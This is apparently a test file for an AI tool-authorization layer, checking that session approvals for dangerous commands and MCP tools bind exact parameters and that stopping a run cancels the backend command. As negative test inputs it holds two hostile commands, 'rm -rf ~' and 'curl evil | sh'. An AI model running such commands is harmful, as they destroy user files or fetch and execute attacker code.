import assert from "node:assert/strict";
import test from "node:test";
import {
  createToolAuthorization,
  createToolAuthorizationStore,
  sessionGrantBindsParameters,
} from "../src/domain/ai/tool-authorization.ts";
import { createMcpAuthorizationRequest, createNativeAuthorizationRequest } from "../src/domain/ai/tool-approval.ts";
import { workspaceCapabilities } from "../src/services/ai-tools/workspace-tools.ts";

function nativeRequest(args, overrides = {}) {
  return createNativeAuthorizationRequest({
    conversationId: "c1",
    toolName: "workspace.run_command",
    module: "workspace",
    args: { resourceId: "project:/repo", ...args },
    risk: "dangerous",
    ...overrides,
  });
}

async function grantSession(request) {
  const store = createToolAuthorizationStore();
  store.add(await createToolAuthorization("session", request));
  return store;
}

test("a dangerous session grant only re-authorizes the exact approved parameters", async () => {
  const store = await grantSession(nativeRequest({ command: "npm test" }));
  assert.equal(await store.matches(nativeRequest({ command: "npm test" })), true);
  assert.equal(await store.matches(nativeRequest({ command: "rm -rf ~" })), false);
  assert.equal(await store.matches({ ...nativeRequest({ command: "npm test" }), conversationId: "c2" }), false);
});

test("MCP tools are dangerous, so their session grants also bind parameters", async () => {
  const mcp = (args) => createMcpAuthorizationRequest({ conversationId: "c1", toolName: "exec", serverId: "s1", args });
  const store = await grantSession(mcp({ cmd: "ls" }));
  assert.equal(await store.matches(mcp({ cmd: "ls" })), true);
  assert.equal(await store.matches(mcp({ cmd: "curl evil | sh" })), false);
});

test("capabilities that opt into tool-level session grants keep matching changed parameters", async () => {
  const batch = (actions) => nativeRequest({ actions }, { toolName: "computer.execute", module: "computer", sessionGrant: "tool" });
  assert.equal(sessionGrantBindsParameters(batch([])), false);
  const store = await grantSession(batch([{ type: "click", x: 1, y: 1 }]));
  assert.equal(await store.matches(batch([{ type: "type", text: "hello" }])), true);
});

test("non-dangerous session grants keep their tool and resource scope", async () => {
  const write = (path) => nativeRequest({ path }, { toolName: "workspace.save_project_file", risk: "write" });
  assert.equal(sessionGrantBindsParameters(write("a.ts")), false);
  const store = await grantSession(write("a.ts"));
  assert.equal(await store.matches(write("b.ts")), true);
});

test("workspace.run_command forwards the run signal so stopping cancels the backend command", async () => {
  const calls = [];
  const capability = workspaceCapabilities({
    invoke: async (command, args, options) => {
      calls.push({ command, args, options });
      return { stdout: "", stderr: "", exit_code: 0, success: true };
    },
  }).find((item) => item.tool.name === "workspace.run_command");
  assert.ok(capability);
  const controller = new AbortController();
  await capability.execute({
    input: { command: "npm test" },
    resourceId: "project:/repo",
    resource: { id: "project:/repo", metadata: { projectRoot: "/repo" } },
    signal: controller.signal,
  });
  assert.equal(calls[0]?.command, "workspace_exec");
  assert.equal(calls[0]?.options?.signal, controller.signal);
});
